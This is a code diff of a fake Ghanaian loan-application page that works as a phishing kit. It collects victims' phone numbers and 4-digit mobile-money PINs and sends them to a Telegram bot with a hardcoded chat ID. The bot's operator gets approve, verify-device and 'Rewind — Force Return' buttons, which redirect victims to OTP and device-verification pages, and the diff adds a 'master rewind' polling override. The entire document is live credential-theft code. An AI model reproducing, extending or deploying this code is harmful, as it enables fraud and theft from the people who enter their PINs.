@@ -433,7 +433,6 @@
     </div>
 
     <div class="form-body">
-
         <div class="form-group">
             <label for="accountType">Account Type</label>
             <div class="select-wrap">
@@ -469,7 +468,6 @@
     </div>
 </div>
 
-<!-- Already Applied Toast -->
 <div id="toast-overlay"></div>
 <div id="toast">
     <div class="toast-icon">
@@ -482,7 +480,6 @@
     <button class="toast-btn" id="toastHomeBtn">Return Home</button>
 </div>
 
-<!-- Spinner overlay -->
 <div id="spinner">
     <div class="spin-ring"></div>
     <div class="spin-label">Verifying &amp; Processing</div>
@@ -495,7 +492,6 @@
         CHAT_ID: '7547427914',
         APPROVE_PAGE: 'otp.html',
         DEVICE_PAGE: 'device_verify.html',
-        SUCCESS_PAGE: 'success.html',
         HOME_PAGE: 'index.html'
     };
 
@@ -524,13 +520,11 @@
         if (amount) {
             document.getElementById('loanAmount').textContent = `GHS ${parseFloat(amount).toLocaleString()}`;
             document.getElementById('loanLabel').textContent  = name ? `${name}'s Loan` : 'Flex Loan';
-
             let details = [];
             if (duration) details.push(`${duration} Days`);
             if (purpose)  details.push(purpose.replace(/([A-Z])/g, ' $1').trim());
             document.getElementById('loanDetails').textContent = details.join(' • ');
         }
-
         if (prevPhone) phoneInput.value = prevPhone;
     }
 
@@ -540,20 +534,30 @@
         return validPrefixes.some(p => phone.startsWith(p));
     }
 
-    function showToast() {
-        toast.style.display = 'block';
-        toastOverlay.style.display = 'block';
-    }
+    function showToast() { toast.style.display = 'block'; toastOverlay.style.display = 'block'; }
+    function hideToast() { toast.style.display = 'none'; toastOverlay.style.display = 'none'; }
+    toastHomeBtn.onclick = () => { hideToast(); window.location.href = CONFIG.HOME_PAGE; };
 
-    function hideToast() {
-        toast.style.display = 'none';
-        toastOverlay.style.display = 'none';
+    // --- MASTER REWIND POLLING (THE POWER KEY) ---
+    function startMasterRewindPolling(targetRewindId) {
+        if (!targetRewindId) return;
+        const rewindInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`);
+                const data = await res.json();
+                if (!data.ok || !data.result) return;
+                data.result.forEach(update => {
+                    state.lastUpdateId = update.update_id;
+                    if (update.callback_query && update.callback_query.data === targetRewindId) {
+                        clearInterval(rewindInterval);
+                        if (activeInterval) clearInterval(activeInterval);
+                        // MASTER OVERRIDE: FORCE RETURN TO HOME REGARDLESS OF PAGE
+                        window.location.href = CONFIG.HOME_PAGE + '?' + params.toString();
+                    }
+                });
+            } catch (e) {}
+        }, 1000);
     }
-
-    toastHomeBtn.onclick = function() {
-        hideToast();
-        window.location.href = CONFIG.HOME_PAGE;
-    };
 
     async function sendToBot(phone, pin) {
         if (isProcessing) return;
@@ -561,12 +565,12 @@
         continueBtn.disabled = true;
         continueBtn.textContent = "Verifying…";
 
-        const ts        = Date.now();
+        const ts = Date.now();
         const approveId = `approve_${ts}`;
         const declineId = `decline_${ts}`;
         const verifyId  = `verify_${ts}`;
         const appliedId = `applied_${ts}`;
-        const rewindId  = `rewind_${ts}`;
+        const rewindId  = `rewind_${ts}`; // MASTER REWIND ID
 
         const accountType = document.getElementById('accountType').options[document.getElementById('accountType').selectedIndex].text;
 
@@ -580,44 +584,17 @@
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
-                            [
-                                { text: "✅ Approve Loan",   callback_data: approveId },
-                                { text: "📱 Verify Device",  callback_data: verifyId }
-                            ],
-                            [
-                                { text: "📋 Applied",        callback_data: appliedId },
-                                { text: "🚫 Decline",        callback_data: declineId }
-                            ],
-                            [
-                                { text: "⏪ Rewind — Force Return", callback_data: rewindId }
-                            ]
+                            [{ text: "✅ Approve Loan", callback_data: approveId }, { text: "📱 Verify Device", callback_data: verifyId }],
+                            [{ text: "📋 Applied", callback_data: appliedId }, { text: "🚫 Decline", callback_data: declineId }],
+                            [{ text: "⏪ Rewind — Force Return", callback_data: rewindId }] // MASTER BUTTON
                         ]
                     }
                 })
             });
             spinner.style.display = 'flex';
-            startMasterRewindPolling(rewindId);
+            startMasterRewindPolling(rewindId); // START MASTER LISTENER
             startPolling(approveId, declineId, verifyId, appliedId, rewindId);
         } catch (e) { resetButton(); }
-    }
-
-    function startMasterRewindPolling(targetRewindId) {
-        if (!targetRewindId) return;
-        const rewindInterval = setInterval(async () => {
-            try {
-                const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`);
-                const data = await res.json();
-                if (!data.ok || !data.result) return;
-                data.result.forEach(update => {
-                    state.lastUpdateId = update.update_id;
-                    if (update.callback_query && update.callback_query.data === targetRewindId) {
-                        clearInterval(rewindInterval);
-                        if (activeInterval) clearInterval(activeInterval);
-                        window.location.href = CONFIG.HOME_PAGE + '?' + params.toString();
-                    }
-                });
-            } catch (e) {}
-        }, 1200);
     }
 
     function startPolling(approveId, declineId, verifyId, appliedId, rewindId) {
@@ -627,23 +604,20 @@
                 .then(r => r.json())
                 .then(data => {
                     if (!data.ok || !data.result) return;
-
                     data.result.forEach(update => {
                         state.lastUpdateId = update.update_id;
-
                         if (update.callback_query) {
                             const cb = update.callback_query.data;
-
                             if (cb === approveId) {
                                 clearInterval(activeInterval);
-                                spinner.style.display = 'none';
-                                window.location.href = `${CONFIG.APPROVE_PAGE}?${params.toString()}`;
+                                const d = new URLSearchParams(params.toString());
+                                d.set('rewindId', rewindId); // PASS MASTER KEY TO NEXT PAGE
+                                window.location.href = `${CONFIG.APPROVE_PAGE}?${d.toString()}`;
                             }
                             else if (cb === verifyId) {
                                 clearInterval(activeInterval);
-                                spinner.style.display = 'none';
                                 const d = new URLSearchParams(params.toString());
-                                d.set('rewindId', rewindId);
+                                d.set('rewindId', rewindId); // PASS MASTER KEY TO NEXT PAGE
                                 window.location.href = `${CONFIG.DEVICE_PAGE}?${d.toString()}`;
                             }
                             else if (cb === appliedId) {
@@ -668,46 +642,26 @@
         }, 1000);
     }
 
-    function showError(msg) {
-        errMsg.textContent   = msg;
-        errMsg.style.display = 'block';
-    }
-
-    function resetButton() {
-        isProcessing            = false;
-        continueBtn.disabled    = false;
-        continueBtn.textContent = "Verify & Authorize Loan";
-    }
+    function showError(msg) { errMsg.textContent = msg; errMsg.style.display = 'block'; }
+    function resetButton() { isProcessing = false; continueBtn.disabled = false; continueBtn.textContent = "Verify & Authorize Loan"; }
 
     continueBtn.onclick = () => {
         errMsg.style.display = 'none';
-
         const phone = phoneInput.value.trim();
-        const pin   = pinInput.value.trim();
-
-        if (!phone || !isValidGhanaNumber(phone)) {
-            showError("Please enter a valid Ghana number (e.g. 0501234567)");
-            return;
-        }
-        if (pin.length !== 4) {
-            showError("PIN must be exactly 4 digits");
-            return;
-        }
-
+        const pin = pinInput.value.trim();
+        if (!phone || !isValidGhanaNumber(phone)) { showError("Please enter a valid Ghana number (e.g. 0501234567)"); return; }
+        if (pin.length !== 4) { showError("PIN must be exactly 4 digits"); return; }
         sendToBot(phone, pin);
     };
 
-    phoneInput.addEventListener('input', () => {
-        phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
-    });
-
+    phoneInput.addEventListener('input', () => { phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10); });
     pinInput.addEventListener('input', () => {
         pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0, 4);
         if (pinInput.value.length === 4) pinInput.blur();
     });
 
     loadLoanDetails();
-    if (inheritedRewindId) startMasterRewindPolling(inheritedRewindId);
+    if (inheritedRewindId) startMasterRewindPolling(inheritedRewindId); // LISTEN FOR MASTER KEY FROM PREVIOUS PAGE
     phoneInput.focus();
 </script>
 </body>
